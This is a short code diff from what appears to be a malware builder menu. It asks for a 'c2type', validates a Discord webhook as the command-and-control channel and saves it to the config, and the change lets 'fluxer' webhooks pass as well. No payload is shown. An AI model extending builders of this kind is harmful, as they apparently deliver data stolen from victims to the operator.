@@ -100,7 +100,7 @@ def menu():
                 while True:
                     if c2type.lower() == 'discord':
                         webhook = Logging.inp('Builder', 'Webhook')
-                        if webhook.startswith('https://') and 'discord' in webhook and 'api/webhooks/' in webhook:
+                        if webhook.startswith('https://') and ('discord' in webhook or 'fluxer' in webhook) and '/webhooks/' in webhook:
                             valid = testwebhook(webhook)
                             if valid == 'valid':
                                 config['hook'] = webhook
